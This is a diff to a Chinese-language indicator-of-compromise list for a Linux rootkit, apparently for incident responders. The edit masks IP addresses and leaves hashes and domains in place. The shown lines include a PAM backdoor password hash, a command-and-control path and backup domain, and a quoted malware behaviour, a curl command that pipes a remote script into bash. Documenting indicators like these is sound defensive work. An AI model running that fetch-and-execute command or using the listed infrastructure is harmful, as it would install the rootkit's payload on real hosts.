@@ -1,4 +1,5 @@
-# IOC 清单 —— Linux rootkit (child.malware 家族, 采集自 154.219.110.37)
+# IOC 清单 —— Linux rootkit (child.malware 家族, 采集自 ***.***)
+# 注：公开版本所有 IP 已脱敏为 ***.***；哈希、域名、账户名、公钥指纹未脱敏。完整 IP 见内部取证包。
 # 生成时间：2026-11-14
 # 用法：拷贝到排查主机，按注释逐组 grep / 比对
 
@@ -117,7 +118,7 @@ PAM 备用哈希（/etc/.pm 为 REPLACE 时生效）：
 $6$cONA0kbmpUGiT1Vt$j7LdoaXFCMA5lr32B/LMOnvY3z7id6CUEfSl9hIl9lH0kSYNIq.NLLLnGJ7lPCuqnQqHwDnzWO19SNzwD8Fgs/
 
 ## 5. 网络
-195.24.237.240               (C2, 路径 /.x/black3)
+***.***               (C2, 路径 /.x/black3)
 digital.digitaldatainsights.org  (备用 C2, 路径 /.x/black3)
 行为：curl -s --connect-timeout 15 <C2>/.x/black3 | bash
 
